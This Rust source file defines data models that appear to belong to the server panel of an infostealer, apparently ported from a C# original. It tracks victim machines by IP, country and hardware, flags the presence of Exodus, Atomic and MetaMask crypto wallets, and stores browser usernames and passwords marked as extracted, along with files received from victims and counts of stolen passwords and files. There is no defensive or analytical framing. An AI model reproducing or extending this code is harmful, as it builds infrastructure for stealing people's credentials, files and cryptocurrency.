use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use uuid::Uuid;

/// Client information structure matching the original C# implementation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientInfo {
    pub id: Uuid,
    pub ip: String,
    pub country: String,
    pub os: String,
    pub gpu: String,
    pub cpu: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub connection_count: u64,
    pub wallet_exodus: bool,
    pub wallet_atomic: bool,
    pub wallet_metamask: bool,
}

impl ClientInfo {
    pub fn new(ip: String, country: String, os: String, gpu: String, cpu: String) -> Self {
        let now = Utc::now();
        Self {
            id: Uuid::new_v4(),
            ip,
            country,
            os,
            gpu,
            cpu,
            first_seen: now,
            last_seen: now,
            connection_count: 1,
            wallet_exodus: false,
            wallet_atomic: false,
            wallet_metamask: false,
        }
    }

    pub fn update_connection(&mut self) {
        self.last_seen = Utc::now();
        self.connection_count += 1;
    }
}

/// Password entry structure from browser data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PasswordEntry {
    pub id: Uuid,
    pub client_ip: String,
    pub url: String,
    pub web_browser: String,
    pub username: String,
    pub password: String,
    pub strength: String,
    pub created_time: Option<DateTime<Utc>>,
    pub extracted_time: DateTime<Utc>,
}

/// Geographic location for client mapping
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GeoLocation {
    pub latitude: f64,
    pub longitude: f64,
}

/// File transfer information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileTransfer {
    pub id: Uuid,
    pub client_ip: String,
    pub filename: String,
    pub size: u64,
    pub received_bytes: u64,
    pub started_at: DateTime<Utc>,
    pub completed_at: Option<DateTime<Utc>>,
    pub status: TransferStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TransferStatus {
    InProgress,
    Completed,
    Failed,
    Cancelled,
}

/// System statistics
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemStats {
    pub total_clients: u64,
    pub active_clients_24h: u64,
    pub active_clients_7d: u64,
    pub active_clients_30d: u64,
    pub total_passwords: u64,
    pub total_files: u64,
    pub country_stats: std::collections::HashMap<String, u64>,
}

impl Default for SystemStats {
    fn default() -> Self {
        Self {
            total_clients: 0,
            active_clients_24h: 0,
            active_clients_7d: 0,
            active_clients_30d: 0,
            total_passwords: 0,
            total_files: 0,
            country_stats: std::collections::HashMap::new(),
        }
    }
}